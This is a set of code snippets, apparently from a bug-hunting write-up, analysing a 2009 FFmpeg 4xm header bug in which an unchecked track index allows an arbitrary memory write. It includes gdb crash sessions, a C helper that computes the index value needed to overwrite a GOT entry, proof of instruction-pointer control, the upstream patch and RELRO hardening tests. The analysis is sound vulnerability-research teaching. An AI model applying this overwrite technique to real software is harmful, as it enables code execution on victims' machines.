["```\n[..]\nByteIOContext *pb = s->pb;\n[..]\n```", "```\n[..]\n 93    static int fourxm_read_header(AVFormatContext *s,\n 94                                  AVFormatParameters *ap)\n 95    {\n `96      ByteIOContext *pb = s->pb;`\n ..\n`101      unsigned char *header;`\n ..\n`103      int current_track = −1;`\n ..\n`106      fourxm->track_count = 0;`\n`107      fourxm->tracks = NULL;`\n ..\n120       /* allocate space for the header and load the whole thing */\n`121       header = av_malloc(header_size);`\n122       if (!header)\n123           return AVERROR(ENOMEM);\n`124       if (get_buffer(pb, header, header_size) != header_size)`\n125           return AVERROR(EIO);\n ..\n`160      } else if (fourcc_tag == strk_TAG) {`\n161          /* check that there is enough data */\n162          if (size != strk_SIZE) {\n163              av_free(header);\n164              return AVERROR_INVALIDDATA;\n165          }\n`166          current_track = AV_RL32(&header[i + 8]);`\n`167          if (current_track + 1 > fourxm->track_count) {`\n168             fourxm->track_count = current_track + 1;\n169             if((unsigned)fourxm->track_count >= UINT_MAX / sizeof(AudioTrack))\n170               return −1;\n`171             fourxm->tracks = av_realloc(fourxm->tracks,`\n`172                 fourxm->track_count * sizeof(AudioTrack));`\n173             if (!fourxm->tracks) {\n174               av_free(header);\n175               return AVERROR(ENOMEM);\n176             }\n177          }\n`178          fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);`\n`179          fourxm->tracks[current_track].channels = AV_RL32(&header[i + 36]);`\n`180          fourxm->tracks[current_track].sample_rate = AV_RL32(&header[i + 40]);`\n`181          fourxm->tracks[current_track].bits = AV_RL32(&header[i + 44]);`\n[..]\n```", "```\nlinux$ `wget -q http://samples.mplayerhq.hu/ga`\n`me-formats/4xm/`\n                     → `TimeGatep01s01n01a02_2.4xm`\n```", "```\nbytes 0-3    fourcc: 'strk'\nbytes 4-7    length of strk structure (40 or 0x28 bytes)\nbytes 8-11   track number\nbytes 12-15  audio type: 0 = PCM, 1 = 4X IMA ADPCM\nbytes 16-35  unknown\nbytes 36-39  number of audio channels\nbytes 40-43  audio sample rate\nbytes 44-47  audio sample resolution (8 or 16 bits)\n```", "```\n[..]\n178       fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\n179       fourxm->tracks[current_track].channels = AV_RL32(&header[i + 36]);\n180       fourxm->tracks[current_track].sample_rate = AV_RL32(&header[i + 40]);\n181       fourxm->tracks[current_track].bits = AV_RL32(&header[i + 44]);\n[..]\n```", "```\nNULL[user_controlled_value].offset = user_controlled_data;\n```", "```\nlinux$ `./ffmpeg_g -i original.4xm original.avi`\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\n  configuration:\n  libavutil     49.12\\. 0 / 49.12\\. 0\n  libavcodec    52.10\\. 0 / 52.10\\. 0\n  libavformat   52.23\\. 1 / 52.23\\. 1\n  libavdevice   52\\. 1\\. 0 / 52\\. 1\\. 0\n  built on Jan 24 2009 02:30:50, gcc: 4.3.3\nInput #0, 4xm, from 'original.4xm':\n  Duration: 00:00:13.20, start: 0.000000, bitrate: 704 kb/s\n    Stream #0.0: Video: 4xm, rgb565, 640x480, 15.00 tb(r)\n    Stream #0.1: Audio: pcm_s16le, 22050 Hz, stereo, s16, 705 kb/s\nOutput #0, avi, to 'original.avi':\n    Stream #0.0: Video: mpeg4, yuv420p, 640x480, q=2-31, 200 kb/s, 15.00 tb(c)\n    Stream #0.1: Audio: mp2, 22050 Hz, stereo, s16, 64 kb/s\nStream mapping:\n  Stream #0.0 -> #0.0\n  Stream #0.1 -> #0.1\nPress [q] to stop encoding\nframe=   47 fps=  0 q=2.3 Lsize=     194kB time=3.08 bitrate= 515.3kbits/s\nvideo:158kB audio:24kB global headers:0kB muxing overhead 6.715897%\n```", "```\nlinux$ `gdb ./ffmpeg_g`\nGNU gdb 6.8-debian\nCopyright (C) 2008 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i486-linux-gnu\"...\n\n(gdb) `set disassembly-flavor intel`\n\n(gdb) `run -i poc1.4xm`\nStarting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc1.4xm\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\n  configuration:\n  libavutil     49.12\\. 0 / 49.12\\. 0\n  libavcodec    52.10\\. 0 / 52.10\\. 0\n  libavformat   52.23\\. 1 / 52.23\\. 1\n  libavdevice   52\\. 1\\. 0 / 52\\. 1\\. 0\n  built on Jan 24 2009 02:30:50, gcc: 4.3.3\n\n`Program received signal SIGSEGV, Segmentation fault.`\n`0x0809c89d in fourxm_read_header (s=0x8913330,`\n `ap=0xbf8b6c24) at libavformat/4xm.c:178`\n`178     fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);`\n```", "```\n(gdb) `info registers`\n`eax            0xbbbbbbbb`    −1145324613\necx            0x891c400     143770624\nedx            0x0           0\n`ebx            0xaaaaaaaa`    −1431655766\nesp            0xbf8b6aa0    0xbf8b6aa0\nebp            0x55555548    0x55555548\nesi            0x891c3c0     143770560\nedi            0x891c340     143770432\neip            0x809c89d     0x809c89d <fourxm_read_header+509>\neflags         0x10207       [ CF PF IF RF ]\ncs             0x73          115\nss             0x7b          123\nds             0x7b          123\nes             0x7b          123\nfs             0x0           0\ngs             0x33          51\n```", "```\n(gdb) `x/1i $eip`\n0x809c89d <fourxm_read_header+509>:    mov    DWORD PTR [edx+ebp*1+0x10],eax\n```", "```\n(gdb) `x/7i $eip - 21`\n0x809c888 <fourxm_read_header+488>:    lea    ebp,[ebx+ebx*4]\n0x809c88b <fourxm_read_header+491>:    mov    eax,DWORD PTR [esp+0x34]\n0x809c88f <fourxm_read_header+495>:    mov    edx,DWORD PTR [esi+0x10]\n0x809c892 <fourxm_read_header+498>:    mov    DWORD PTR [esp+0x28],ebp\n0x809c896 <fourxm_read_header+502>:    shl    ebp,0x2\n0x809c899 <fourxm_read_header+505>:    mov    eax,DWORD PTR [ecx+eax*1+0xc]\n0x809c89d <fourxm_read_header+509>:    mov    DWORD PTR [edx+ebp*1+0x10],eax\n```", "```\n[..]\n178       fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\n[..]\n```", "```\nedx + ((ebx + ebx * 4) << 2) + 0x10 = destination address of the write operation\n```", "```\nedx + (ebx * 20) + 0x10 = destination address of the write operation\n```", "```\nNULL + (0xaaaaaaaa * 20) + 0x10 = 0x55555558\n```", "```\n(gdb) `x/1x $edx+$ebp+0x10`\n0x55555558:    Cannot access memory at address 0x55555558\n```", "```\n[..]\n184         /* allocate a new AVStream */\n`185         st = av_new_stream(s, current_track);`\n[..]\n```", "```\n[..]\n`2271    AVStream *av_new_stream(AVFormatContext *s, int id)`\n2272    {\n2273        AVStream *st;\n2274        int i;\n2275\n2276        if (s->nb_streams >= MAX_STREAMS)\n2277            return NULL;\n2278\n`2279        st = av_mallocz(sizeof(AVStream));`\n[..]\n```", "```\n[..]\n`43    void *av_malloc(unsigned int size)`\n44    {\n45        void *ptr = NULL;\n46    #ifdef CONFIG_MEMALIGN_HACK\n47        long diff;\n48    #endif\n49\n50        /* let's disallow possible ambiguous cases */\n51        if(size > (INT_MAX-16) )\n52            return NULL;\n53\n54    #ifdef CONFIG_MEMALIGN_HACK\n55        ptr = malloc(size+16);\n56        if(!ptr)\n57            return ptr;\n58        diff= ((-(long)ptr - 1)&15) + 1;\n59        ptr = (char*)ptr + diff;\n60        ((char*)ptr)[-1]= diff;\n61    #elif defined (HAVE_POSIX_MEMALIGN)\n62        posix_memalign(&ptr,16,size);\n63    #elif defined (HAVE_MEMALIGN)\n`64        ptr = memalign(16,size);`\n[..]\n`135    void *av_mallocz(unsigned int size)`\n136    {\n`137        void *ptr = av_malloc(size);`\n138        if (ptr)\n139            memset(ptr, 0, size);\n140        return ptr;\n141    }\n[..]\n```", "```\nlinux$ `objdump -R ffmpeg_g | grep memalign`\n08560204 R_386_JUMP_SLOT   posix_memalign\n```", "```\n01    #include <stdio.h>\n02\n03    // GOT entry address of memalign()\n04    #define MEMALIGN_GOT_ADDR       0x08560204\n05\n06    // Min and max value for 'current_track'\n07    #define SEARCH_START            0x80000000\n08    #define SEARCH_END              0xFFFFFFFF\n09\n10    int\n11    main (void)\n12    {\n13           unsigned int  a, b    = 0;\n14\n15           for (a = SEARCH_START; a < SEARCH_END; a++) {\n16                   b = (a * 20) + 0x10;\n17                   if (b == MEMALIGN_GOT_ADDR) {\n18                         printf (\"Value for 'current_track': %08x\\n\", a);\n19                         return 0;\n20                   }\n21           }\n22\n23           printf (\"No valid value for 'current_track' found.\\n\");\n24\n25           return 1;\n26    }\n```", "```\nlinux$ `gcc -o addr_brute_force addr_brute_force.c`\nlinux$ `./addr_brute_force`\nValue for 'current_track': 8d378019\n```", "```\nlinux$ `gdb -q ./ffmpeg_g`\n\n(gdb) `run -i poc2.4xm`\nStarting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc2.4xm\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\n  configuration:\n  libavutil     49.12\\. 0 / 49.12\\. 0\n  libavcodec    52.10\\. 0 / 52.10\\. 0\n  libavformat   52.23\\. 1 / 52.23\\. 1\n  libavdevice   52\\. 1\\. 0 / 52\\. 1\\. 0\n  built on Jan 24 2009 02:30:50, gcc: 4.3.3\n\nProgram received signal SIGSEGV, Segmentation fault.\n`0xbbbbbbbb in ?? ()`\n\n(gdb) `info registers`\neax            0xbfc1ddd0    −1077813808\necx            0x9f69400     167154688\nedx            0x9f60330     167117616\nebx            0x0           0\nesp            0xbfc1ddac    0xbfc1ddac\nebp            0x85601f4     0x85601f4\nesi            0x164         356\nedi            0x9f60330     167117616\n`eip            0xbbbbbbbb    0xbbbbbbbb`\neflags         0x10293       [ CF AF SF IF RF ]\ncs             0x73          115\nss             0x7b          123\nds             0x7b          123\nes             0x7b          123\nfs             0x0           0\ngs             0x33          51\n```", "```\n--- a/libavformat/4xm.c\n+++ b/libavformat/4xm.c\n@@ −166,12 +166,13 @@ static int fourxm_read_header(AVFormatContext *s,\n                 goto fail;\n             }\n             current_track = AV_RL32(&header[i + 8]);\n`+            if((unsigned)current_track >= UINT_MAX / sizeof(AudioTrack) - 1){`\n`+                av_log(s, AV_LOG_ERROR, \"current_track too large\\n\");`\n`+                ret= −1;`\n`+                goto fail;`\n`+            }`\n             if (current_track + 1 > fourxm->track_count) {\n                 fourxm->track_count = current_track + 1;\n`-                if((unsigned)fourxm->track_count >= UINT_MAX / sizeof(AudioTrack)){`\n`-                    ret= −1;`\n`-                    goto fail;`\n`-                }`\n                 fourxm->tracks = av_realloc(fourxm->tracks,\n                     fourxm->track_count * sizeof(AudioTrack));\n                 if (!fourxm->tracks) {\n```", "```\n(UINT_MAX   / sizeof(AudioTrack) - 1) - 1 = maximum allowed value for current_track\n(0xffffffff / 0x1c               - 1) - 1 = 0x09249247\n```", "```\nlinux$ `./configure --extra-ldflags=\"-Wl,-z,relro,-z,now\"`\nlinux$ `make`\n```", "```\nlinux$ `objdump -R ./ffmpeg_g | grep memalign`\n0855ffd0 R_386_JUMP_SLOT   posix_memalign\n```", "```\nlinux$ `./addr_brute_force`\nValue for 'current_track': 806ab330\n```", "```\nlinux$ `gdb -q ./ffmpeg_g`\n\n(gdb) `set disassembly-flavor intel`\n\n(gdb) `run -i poc_relro.4xm`\nStarting program: /home/tk/BHD/ffmpeg_relro/ffmpeg_g -i poc_relro.4xm\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\n  configuration: --extra-ldflags=-Wl,-z,relro,-z,now\n  libavutil     49.12\\. 0 / 49.12\\. 0\n  libavcodec    52.10\\. 0 / 52.10\\. 0\n  libavformat   52.23\\. 1 / 52.23\\. 1\n  libavdevice   52\\. 1\\. 0 / 52\\. 1\\. 0\n  built on Jan 24 2009 09:07:58, gcc: 4.3.3\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0809c89d in fourxm_read_header (s=0xa836330, ap=0xbfb19674) at libavformat/4xm.c:178\n178     fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\n```", "```\n(gdb) `info registers`\neax            0xbbbbbbbb    −1145324613\necx            0xa83f3e0     176419808\nedx            0x0           0\nebx            0x806ab330    −2140490960\nesp            0xbfb194f0    0xbfb194f0\nebp            0x855ffc0     0x855ffc0\nesi            0xa83f3a0     176419744\nedi            0xa83f330     176419632\neip            0x809c89d     0x809c89d <fourxm_read_header+509>\neflags         0x10206       [ PF IF RF ]\ncs             0x73          115\nss             0x7b          123\nds             0x7b          123\nes             0x7b          123\nfs             0x0           0\ngs             0x33          51\n\n(gdb) `x/1i $eip`\n0x809c89d <fourxm_read_header+509>:    mov    DWORD PTR [edx+ebp*1+0x10],eax\n```", "```\n(gdb) `x/1x $edx+$ebp+0x10`\n0x855ffd0 <_GLOBAL_OFFSET_TABLE_+528>:    0xb7dd4d40\n```", "```\n(gdb) `shell cat /proc/$(pidof ffmpeg_g)/maps`\n08048000-0855f000 r-xp 00000000 08:01 101582     /home/tk/BHD/ffmpeg_relro/ffmpeg_g\n`0855f000-08560000 r--p 00516000 08:01 101582     /home/tk/BHD/ffmpeg_relro/ffmpeg_g`\n08560000-0856c000 rw-p 00517000 08:01 101582     /home/tk/BHD/ffmpeg_relro/ffmpeg_g\n0856c000-0888c000 rw-p 0856c000 00:00 0\n0a834000-0a855000 rw-p 0a834000 00:00 0          [heap]\nb7d60000-b7d61000 rw-p b7d60000 00:00 0\nb7d61000-b7ebd000 r-xp 00000000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so\nb7ebd000-b7ebe000 ---p 0015c000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so\nb7ebe000-b7ec0000 r--p 0015c000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so\nb7ec0000-b7ec1000 rw-p 0015e000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so\nb7ec1000-b7ec5000 rw-p b7ec1000 00:00 0\nb7ec5000-b7ec7000 r-xp 00000000 08:01 148208     /lib/tls/i686/cmov/libdl-2.9.so\nb7ec7000-b7ec8000 r--p 00001000 08:01 148208     /lib/tls/i686/cmov/libdl-2.9.so\nb7ec8000-b7ec9000 rw-p 00002000 08:01 148208     /lib/tls/i686/cmov/libdl-2.9.so\nb7ec9000-b7eed000 r-xp 00000000 08:01 148210     /lib/tls/i686/cmov/libm-2.9.so\nb7eed000-b7eee000 r--p 00023000 08:01 148210     /lib/tls/i686/cmov/libm-2.9.so\nb7eee000-b7eef000 rw-p 00024000 08:01 148210     /lib/tls/i686/cmov/libm-2.9.so\nb7efc000-b7efe000 rw-p b7efc000 00:00 0\nb7efe000-b7eff000 r-xp b7efe000 00:00 0          [vdso]\nb7eff000-b7f1b000 r-xp 00000000 08:01 130839     /lib/ld-2.9.so\nb7f1b000-b7f1c000 r--p 0001b000 08:01 130839     /lib/ld-2.9.so\nb7f1c000-b7f1d000 rw-p 0001c000 08:01 130839     /lib/ld-2.9.so\nbfb07000-bfb1c000 rw-p bffeb000 00:00 0          [stack]\n```"]